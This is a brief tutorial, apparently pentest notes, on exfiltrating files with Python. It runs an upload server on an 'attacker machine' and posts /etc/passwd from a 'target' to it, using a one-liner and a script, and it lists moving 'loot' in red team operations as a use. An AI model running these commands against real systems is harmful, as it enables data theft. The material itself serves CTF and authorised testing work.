Uploading files with Python3 is simple and efficient, thanks to the `requests` module. This is useful for **CTFs, red teaming, incident response, or admin tasks**.

## 1. Start the Upload Server (Attacker Machine)

On the **attacker (receiver) machine**:

```bash
python3 -m uploadserver
```

**Output Example:**

```
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

The server is now ready to receive uploads on port **8000**.

## 2. Upload a File (Target Machine)

On the **target (sender) machine**, use a Python3 one-liner:

```bash
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

This uploads `/etc/passwd` from the **target** to the **attackerâ€™s upload server**.

## 3. Full Script Example (Target Machine)

If you prefer a script for clarity:

```python
import requests

# Define target URL
URL = "http://192.168.49.128:8000/upload"

# Open file in binary read mode
file = open("/etc/passwd", "rb")

# Send file
r = requests.post(URL, files={"files": file})
```

**Note:**

- The field name `"files"` must match the expected form field on the server.
    
- If the upload server expects a different parameter (like `"upload"`), change `"files"` to `"upload"`.

## 4. Use Cases

- Uploading collected data or loot during red team operations
    
- Transferring forensic evidence
    
- Moving configurations during system administration
    
- Automating uploads in custom tools or scripts
